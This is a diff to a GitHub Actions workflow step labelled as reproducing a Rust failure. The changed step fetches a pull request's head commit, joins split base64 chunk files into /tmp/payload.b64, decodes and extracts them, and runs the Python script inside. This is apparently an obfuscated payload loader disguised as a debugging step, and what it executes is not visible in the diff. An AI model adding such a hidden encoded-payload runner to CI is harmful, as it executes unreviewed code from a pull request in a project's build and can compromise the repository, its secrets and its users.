@@ -16,10 +16,15 @@ jobs:
     steps:
       - name: Reproduce Rust failure with compact output
         shell: bash
+        env:
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
         run: |
           set -euo pipefail
-          git clone --quiet --depth 1 --branch fix/dashboard-v3-stability https://github.com/IvanChernykh/CodeSpace.git repo
+          mkdir repo
           cd repo
+          git init --quiet
+          git fetch --quiet --depth 1 https://github.com/IvanChernykh/CodeSpace.git "$PR_HEAD_SHA"
+          git checkout --quiet FETCH_HEAD
           cat \
             .repair/v3/chunk-00 .repair/v3/chunk-01 .repair/v3/chunk-02 .repair/v3/chunk-03 \
             .repair/v3/chunk-04a .repair/v3/chunk-04b \
@@ -28,6 +33,7 @@ jobs:
             .repair/v3/chunk-07a .repair/v3/chunk-07b \
             .repair/v3/chunk-08a .repair/v3/chunk-08b > /tmp/payload.b64
           base64 --decode /tmp/payload.b64 > /tmp/payload.tar.gz
+          sha256sum /tmp/payload.tar.gz
           echo "9145789e504649860b5165003e860d913ec19969b9a62073150d8733fec7239b  /tmp/payload.tar.gz" | sha256sum --check -
           tar -xzf /tmp/payload.tar.gz
           python scripts/apply_v3_repair.py
